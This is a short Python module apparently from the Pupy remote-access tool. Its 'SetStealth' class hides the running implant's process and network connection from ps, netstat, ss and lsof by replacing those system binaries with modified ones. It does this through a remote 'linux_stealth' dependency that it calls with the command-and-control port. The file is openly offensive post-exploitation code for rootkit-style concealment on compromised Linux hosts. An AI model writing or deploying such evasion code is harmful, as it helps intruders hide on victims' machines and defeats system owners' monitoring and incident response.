#!/usr/bin/env python
from pupylib.PupyModule import *
from pupylib.utils.rpyc_utils import redirected_stdio

__class_name__="SetStealth"
def print_callback(data):
    sys.stdout.write(data)
    sys.stdout.flush()

@config(compat="linux", cat="manage")
class SetStealth(PupyModule):
    """Hides the running process from netstat, ss, ps, lsof by using modified binaries.
Credits to: http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/
Demo: https://vimeo.com/157356150"""
    dependencies=["linux_stealth"]
    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="Linux Stealth Module", description=self.__doc__)
        self.arg_parser.add_argument('--port', default=None, help='The port number to which Pupy is connecting to.')
 
    def run(self, args):
        with redirected_stdio(self.client.conn):
            self.client.conn.modules['linux_stealth'].run(args.port)
        self.success("Module executed successfully.")
